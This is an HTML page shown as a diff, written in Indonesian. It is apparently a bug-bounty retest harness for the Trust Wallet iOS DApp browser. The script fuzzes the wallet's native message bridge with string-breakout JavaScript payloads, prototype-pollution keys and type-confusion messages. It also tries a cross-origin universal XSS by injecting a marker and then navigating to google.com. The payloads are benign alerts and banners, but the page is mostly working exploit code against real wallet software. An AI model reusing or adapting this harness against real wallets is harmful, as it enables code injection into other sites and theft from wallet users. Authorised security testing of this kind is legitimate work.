@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Trust Wallet — uji rendering dialog sign (jinak, TOLAK dialognya)</title>
+  <title>Trust Wallet bridge v4 — modifikasi struktur/tipe (jinak)</title>
   <style>
     body { font-family: -apple-system, system-ui, sans-serif; margin: 16px; line-height: 1.45; }
     h1 { font-size: 18px; } h2 { font-size: 15px; margin-top: 18px; }
@@ -11,41 +11,35 @@
     #log { white-space: pre-wrap; background: #111; color: #0f0; padding: 12px;
            border-radius: 8px; font-family: ui-monospace, Menlo, monospace; font-size: 12px; }
     .note { color: #555; font-size: 13px; }
-    .warn { color: #a00; font-weight: 600; }
     .box { border: 1px solid #ddd; border-radius: 8px; padding: 12px; margin: 10px 0; }
   </style>
 </head>
 <body>
-  <h1>Uji rendering dialog sign — jinak</h1>
-  <p class="warn">TOLAK / Reject setiap dialog yang muncul. Ini hanya untuk melihat
-    BAGAIMANA teks dirender, bukan untuk menandatangani apa pun.</p>
+  <h1>Bridge v4 — modifikasi struktur &amp; tipe pesan</h1>
   <p class="note">
-    Semua pesan diawali "TW-LAB". Tanpa transaksi, tanpa transfer aset. Uji di
-    perangkat/akun Anda sendiri, dalam scope program. Tujuan: apakah isi pesan yang
-    dikontrol penyerang (newline, panjang, unicode/RTL) bisa dibuat menyerupai UI
-    sistem/origin — sementara origin ASLI tetap harus terlihat jelas.
+    Retest fix-validation, perangkat/akun sendiri, dalam scope. Sumbu BARU: bukan
+    pemutusan-string (itu sudah mati), tapi <b>tipe & struktur</b> pesan bridge.
+    Payload jinak: <code>alert(document.domain)</code> (same-origin) & marker
+    <code>&lt;h1&gt;</code> (lintas-origin). Tanpa provider/sign/transfer.
+    Diam = tertutup; ada alert/banner = jalur itu perlu dilihat lebih lanjut.
   </p>
 
   <div class="box">
-    <h2>0. Origin asli halaman ini</h2>
-    <button id="showOrigin">Tampilkan origin</button>
-    <span class="note">Bandingkan nilai ini dengan apa yang tertera di dialog sign.</span>
+    <h2>A. Control positif (dulu)</h2>
+    <button id="ctlAlert">Tes alert()</button>
+    <button id="ctlDom">Tes penanda DOM</button>
   </div>
 
   <div class="box">
-    <h2>1. Connect (perlu 1 akun untuk personal_sign)</h2>
-    <button id="connect">eth_requestAccounts</button>
-    <span class="note">Boleh reject; kalau connect, tak ada aset yang tersentuh.</span>
+    <h2>B. Fuzz struktur/tipe (same-origin, bukti alert)</h2>
+    <button id="runFuzz">Jalankan</button>
   </div>
 
   <div class="box">
-    <h2>2. Picu personal_sign dengan berbagai bentuk pesan — lalu TOLAK</h2>
-    <button data-k="plain">Pesan polos</button>
-    <button data-k="multiline">Multi-baris (newline)</button>
-    <button data-k="long">Sangat panjang (overflow)</button>
-    <button data-k="rtl">RTL override</button>
-    <button data-k="homoglyph">Teks homoglyph (di ISI, bukan domain)</button>
-    <button data-k="pad">Padding whitespace</button>
+    <h2>C. Satu varian → navigasi ke google.com (bukti marker DOM)</h2>
+    <select id="pick"></select>
+    <button id="runXo">Jalankan &amp; navigasi</button>
+    <span class="note">Cari banner hijau "TW-UXSS-LAB" di paling atas google.</span>
   </div>
 
   <pre id="log">Menunggu…</pre>
@@ -55,55 +49,81 @@
     const log = document.querySelector('#log');
     const lines = [];
     const put = s => { lines.push(s); log.textContent = lines.join('\n'); };
-    const provider = () => window.ethereum || window.trustwallet?.ethereum;
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-    const toHex = str => '0x' + Array.from(new TextEncoder().encode(str),
-      b => b.toString(16).padStart(2, '0')).join('');
+    document.querySelector('#ctlAlert').onclick = () => { alert(document.domain);
+      put('Control alert dipanggil.'); };
+    document.querySelector('#ctlDom').onclick = () => {
+      document.body.insertAdjacentHTML('afterbegin',
+        '<h1 style="background:#0f0;color:#000;margin:0">CONTROL DOM OK — '+document.domain+'</h1>');
+      put('Control DOM disisipkan.'); };
 
-    // Semua pesan-lab jinak. Fitur struktural (newline/RTL/panjang) untuk uji rendering,
-    // BUKAN untuk jadi umpan phishing siap-pakai — teksnya jelas ditandai "TW-LAB".
-    const MESSAGES = {
-      plain:     "TW-LAB: uji rendering pesan polos.",
-      multiline: "TW-LAB baris-1\nTW-LAB baris-2\n\nTW-LAB apakah newline dirender sebagai baris terpisah?",
-      long:      "TW-LAB " + "A".repeat(600) + " [ujung pesan panjang]",
-      rtl:       "TW-LAB ‮ gnitset LLU-BAL-WT ‬ (apakah urutan terbalik?)",
-      homoglyph: "TW-LAB uji homoglyph: gоogle vs google (huruf Sirilik di ISI pesan)",
-      pad:       "TW-LAB\n" + " ".repeat(40) + "\napakah padding menggeser tampilan?"
+    const P_ALERT = 'zz_");alert(document.domain)//';
+    const P_MARK  = 'zz_");(function(){if(!/(^|\\.)google\\.com$/.test(location.hostname))return;'
+                  + 'if(window.__twLab)return;window.__twLab=1;'
+                  + "document.body&&document.body.insertAdjacentHTML('afterbegin',"
+                  + "'<h1 id=tw-uxss-lab style=\"background:#0f0;color:#000;margin:0\">"
+                  + "TW-UXSS-LAB: '+document.domain+'</h1>');})()//";
+
+    // Sumbu BARU: variasi struktur & tipe. Payload string diselipkan di titik-titik
+    // tak biasa; sebagian besar menguji type-confusion/prototype, bukan breakout string.
+    function variants(P, baseId) {
+      return [
+        { d: 'name zero-width',   msg: { id: baseId, network:'ethereum', name:'rpc​Call',
+              object:{ method:P, params:[], jsonrpc:'2.0' } } },
+        { d: 'name uppercase',    msg: { id: baseId, network:'ethereum', name:'RPCCALL',
+              object:{ method:P, params:[], jsonrpc:'2.0' } } },
+        { d: 'name spasi',        msg: { id: baseId, network:'ethereum', name:' rpcCall ',
+              object:{ method:P, params:[], jsonrpc:'2.0' } } },
+        { d: 'object=array',      msg: { id: baseId, network:'ethereum', name:'rpcCall',
+              object:[ P ] } },
+        { d: 'proto key',         msg: { id: baseId, network:'ethereum', name:'rpcCall',
+              object:{ method:'eth_chainId', params:[], jsonrpc:'2.0', __proto__:{ polluted:P } } } },
+        { d: 'constructor key',   msg: { id: baseId, network:'ethereum', name:'rpcCall',
+              object:{ method:'eth_chainId', params:[], jsonrpc:'2.0', constructor:P } } },
+        { d: 'method angka+params obj', msg: { id: baseId, network:'ethereum', name:'rpcCall',
+              object:{ method:1, params:{ data:P }, jsonrpc:'2.0' } } },
+        { d: 'id sebagai object', msg: { id: { toString:()=>P }, network:'ethereum', name:'rpcCall',
+              object:{ method:'eth_chainId', params:[], jsonrpc:'2.0' } } },
+        { d: 'nested dalam',      msg: { id: baseId, network:'ethereum', name:'rpcCall',
+              object:{ method:'eth_chainId', params:[{ a:{ b:{ c:P } } }], jsonrpc:'2.0' } } },
+        { d: 'extra top field',   msg: { id: baseId, network:'ethereum', name:'rpcCall', extra:P,
+              object:{ method:'eth_chainId', params:[], jsonrpc:'2.0' } } }
+      ];
+    }
+
+    // isi dropdown C
+    const names = variants(P_MARK, 0).map(v => v.d);
+    const sel = document.querySelector('#pick');
+    names.forEach((n,i)=>{ const o=document.createElement('option'); o.value=i; o.textContent=n; sel.appendChild(o); });
+
+    document.querySelector('#runFuzz').onclick = async () => {
+      const bridge = window.webkit?.messageHandlers?._tw_;
+      if (!bridge?.postMessage || !window.trustwallet?.ethereum) {
+        put('Buka di DApp browser Trust Wallet iOS.'); return; }
+      lines.length = 0;
+      put('Fuzz struktur/tipe (same-origin). Amati alert. Diam total = tertutup.\n');
+      const vs = variants(P_ALERT, Math.trunc(Date.now()%9e15));
+      for (const v of vs) {
+        put(`— ${v.d}`);
+        try { bridge.postMessage(v.msg); } catch (e) { put(`    tolak: ${String(e)}`); }
+        await sleep(120);
+      }
+      put('\nSelesai. Tidak ada alert = seluruh varian struktur/tipe ini tertutup.');
     };
 
-    document.querySelector('#showOrigin').onclick = () => {
-      put(`origin asli: ${location.origin}  | host: ${location.hostname}`);
+    document.querySelector('#runXo').onclick = () => {
+      const bridge = window.webkit?.messageHandlers?._tw_;
+      if (!bridge?.postMessage || !window.trustwallet?.ethereum) {
+        put('Buka di DApp browser Trust Wallet iOS.'); return; }
+      const i = Number(sel.value);
+      const v = variants(P_MARK, Math.trunc(Date.now()%9e15))[i];
+      lines.length = 0;
+      put(`Lintas-origin: ${v.d}`);
+      try { bridge.postMessage(v.msg); } catch (e) { put(`tolak: ${String(e)}`); }
+      put('Navigasi ke google.com… cari banner "TW-UXSS-LAB".');
+      setTimeout(() => location.assign('https://google.com/'), 120);
     };
-
-    document.querySelector('#connect').onclick = async () => {
-      const p = provider();
-      if (!p?.request) { put('Provider tidak ada — buka di DApp browser Trust Wallet.'); return; }
-      try {
-        const acc = await p.request({ method: 'eth_requestAccounts' });
-        put(`connect OK, akun: ${acc?.[0] ?? '(kosong)'}  — tak ada aset tersentuh.`);
-      } catch (e) { put(`connect ditolak/gagal: ${String(e)}`); }
-    };
-
-    document.querySelectorAll('button[data-k]').forEach(btn => {
-      btn.onclick = async () => {
-        const p = provider();
-        if (!p?.request) { put('Provider tidak ada — buka di DApp browser Trust Wallet.'); return; }
-        const k = btn.getAttribute('data-k');
-        const msg = MESSAGES[k];
-        put(`\n[${k}] memicu personal_sign. >>> TOLAK dialognya. Amati:`);
-        put(`     • origin apa yang tertera di header dialog? (harus ${location.hostname})`);
-        put(`     • apakah isi pesan bisa menyaru jadi UI sistem?`);
-        let acc;
-        try { acc = (await p.request({ method: 'eth_accounts' }))?.[0]; } catch (_) {}
-        if (!acc) { put('     (belum connect — tekan connect dulu di bagian 1)'); return; }
-        try {
-          await p.request({ method: 'personal_sign', params: [toHex(msg), acc] });
-          put('     signature diterima — SEHARUSNYA Anda menolak. Abaikan hasilnya.');
-        } catch (e) {
-          put(`     ditolak (benar): ${String(e).slice(0, 80)}`);
-        }
-      };
-    });
   </script>
 </body>
 </html>
